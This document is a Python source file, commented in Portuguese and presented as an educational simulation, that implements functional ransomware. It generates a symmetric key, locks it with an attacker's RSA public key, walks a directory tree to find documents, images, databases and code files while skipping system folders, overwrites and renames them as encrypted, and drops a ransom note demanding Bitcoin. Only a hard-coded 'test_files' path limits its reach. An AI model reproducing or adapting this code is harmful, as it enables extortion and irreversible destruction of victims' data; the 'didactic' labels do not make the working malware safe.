# Para instalar as dependências, execute: pip install cryptography

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
import os
import sys

# ----------------------------------------------------------------------
# SIMULAÇÃO DE CHAVES DO ATACANTE (APENAS PARA FINS DIDÁTICOS)
# EM UM ATAQUE REAL, SOMENTE A CHAVE PÚBLICA ESTARIA NO MALWARE.
# Para esta simulação, vamos carregar a chave pública do atacante
# a partir do arquivo 'public_key.pem'.
# ----------------------------------------------------------------------

# Chave pública do atacante (usada para criptografar a chave Fernet)
CHAVE_PUBLICA_ARQUIVO = "public_key.pem"
CHAVE_PRIVADA_SIMULADA = None # A chave privada é mantida no servidor C2

def carregar_chave_publica():
    """Carrega a chave pública do atacante do arquivo."""
    try:
        with open(CHAVE_PUBLICA_ARQUIVO, "rb") as key_file:
            return serialization.load_pem_public_key(
                key_file.read(),
                backend=default_backend()
            )
    except FileNotFoundError:
        print(f"[ERRO CRÍTICO] Arquivo da chave pública '{CHAVE_PUBLICA_ARQUIVO}' não encontrado.")
        print("Este código precisa do arquivo 'public_key.pem' para funcionar.")
        sys.exit(1)

# ----------------------------------------------------------------------
# FUNÇÕES CORE DO RANSOMWARE
# ----------------------------------------------------------------------

def gerar_e_proteger_chave_fernet(public_key_attacker):
    """
    MELHORIA V1 e V4: Gera a chave Fernet (simétrica) e a criptografa
    com a chave pública do atacante (RSA), tornando-a irrecuperável localmente.
    """
    # 1. Gerar a chave simétrica (Fernet)
    chave_simetrica = Fernet.generate_key()

    # 2. Criptografar a chave simétrica usando a chave pública do atacante (RSA)
    chave_simetrica_criptografada = public_key_attacker.encrypt(
        chave_simetrica,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # 3. Salvar a chave criptografada em um arquivo (simulando exfiltração)
    # Este arquivo é inútil sem a chave privada do atacante.
    with open("CHAVE_DO_RESGATE.BIN", "wb") as f:
        f.write(chave_simetrica_criptografada)
    
    # Retorna a chave Fernet em formato binário para ser usada imediatamente
    return chave_simetrica

def criptografar_arquivo(caminho_arquivo, chave_fernet):
    """
    MELHORIA V2: Função para criptografar arquivos em um diretório.
    Garante a substituição total do conteúdo original com dados criptografados.
    """
    try:
        f = Fernet(chave_fernet)
        
        # 1. Ler os dados originais
        with open(caminho_arquivo, "rb") as file:
            dados_originais = file.read()
        
        # 2. Criptografar os dados
        dados_criptografados = f.encrypt(dados_originais)
        
        # 3. Sobrescrever o arquivo original com dados criptografados
        with open(caminho_arquivo, "wb") as file:
            file.write(dados_criptografados)

        # 4. Adicionar uma extensão para indicar a criptografia
        os.rename(caminho_arquivo, caminho_arquivo + ".CRYPTED")

    except Exception as e:
        # Em um ransomware real, erros são silenciados.
        print(f"Erro ao criptografar {caminho_arquivo}: {e}")

def encontrar_arquivos(diretorio_base):
    """
    MELHORIA V3: Encontrar arquivos de interesse em um diretório alvo.
    O alvo é 'test_files' para a simulação, mas o padrão de exclusão é mais rigoroso.
    """
    arquivos_a_criptografar = []
    
    # Tipos de arquivos comumente visados (adicionando mais extensões)
    extensoes_alvo = ('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', 
                      '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.zip', '.rar', 
                      '.7z', '.sql', '.db', '.txt', '.py', '.c', '.html', '.css', '.js')

    # Excluir pastas e arquivos críticos do sistema (simulação de evasão)
    pastas_excluidas = ('Windows', 'Program Files', 'Program Files (x86)', '$Recycle.Bin')
    
    for raiz, diretorios, arquivos in os.walk(diretorio_base, topdown=True):
        # Excluir diretorios críticos para evitar quebrar o O.S.
        diretorios[:] = [d for d in diretorios if d not in pastas_excluidas]

        for nome_arquivo in arquivos:
            caminho_completo = os.path.join(raiz, nome_arquivo)
            
            # Não criptografar arquivos do próprio ransomware ou chaves
            if nome_arquivo == os.path.basename(__file__) or nome_arquivo.endswith(('.pem', '.bin')):
                continue

            # Criptografar apenas arquivos de interesse
            if nome_arquivo.lower().endswith(extensoes_alvo):
                arquivos_a_criptografar.append(caminho_completo)
                
    return arquivos_a_criptografar

def criar_mensagem_resgate():
    """Cria a mensagem de resgate com o nome do arquivo da chave criptografada."""
    mensagem = """
SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!

Para sua surpresa e desespero, todos os seus documentos importantes, fotos,
e backups foram criptografados com a criptografia RSA-2048/Fernet.

A chave de descriptografia para seus dados foi criptografada com nossa chave 
pública e salva no arquivo: 'CHAVE_DO_RESGATE.BIN'.

VOCÊ NÃO PODE DESCRIPTOGRAFAR ESTE ARQUIVO SOZINHO.

Para recuperá-los, você deve seguir estes passos:
1. Envie 1 Bitcoin para o endereço: [ENDEREÇO DE BITCOIN FICTÍCIO]
2. Envie um e-mail para [SEU EMAIL FICTÍCIO] com o comprovante de pagamento e o arquivo 'CHAVE_DO_RESGATE.BIN'.

Você receberá a chave privada em resposta, que é a única maneira de ler 
o conteúdo do arquivo 'CHAVE_DO_RESGATE.BIN' e, finalmente, descriptografar seus arquivos.

NÃO TENTE RECUPERAR OS ARQUIVOS SEM NOSSA AJUDA.
QUALQUER TENTATIVA PODE DANIFICAR SEUS DADOS IRREMEDIAVELMENTE.
"""
    with open("LEIA_PARA_RESGATE.txt", "w", encoding='utf-8') as f:
        f.write(mensagem.strip())

def main():
    """Função principal de execução."""
    print("Iniciando simulação de Ransomware Aprimorado (apenas para fins educacionais)...")
    
    # 1. Carregar chave pública do atacante (RSA)
    chave_publica_atacante = carregar_chave_publica()

    # 2. Gerar chave Fernet e protegê-la (criptografando-a com RSA)
    chave_fernet = gerar_e_proteger_chave_fernet(chave_publica_atacante)
    
    # 3. Encontrar e criptografar arquivos
    diretorio_alvo = "test_files" # Mantendo o diretório estático para fins de teste
    if not os.path.isdir(diretorio_alvo):
         print(f"Diretório de teste '{diretorio_alvo}' não encontrado. Crie alguns arquivos lá.")
         return

    arquivos = encontrar_arquivos(diretorio_alvo)
    
    print(f"Criptografando {len(arquivos)} arquivos no diretório: '{diretorio_alvo}'...")

    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave_fernet)
    
    # 4. Deletar a chave simétrica da memória (simulando limpeza)
    del chave_fernet
    
    # 5. Criar mensagem de resgate
    criar_mensagem_resgate()
    
    print("\n[SUCESSO EDUCAÇÃO] Simulação de Ransomware finalizada.")
    print("Arquivos criptografados e chave de resgate salva como 'CHAVE_DO_RESGATE.BIN'.")
    print("Sem a chave privada do atacante (ausente neste código), os arquivos são irrecuperáveis.")

if __name__ == "__main__":
    main()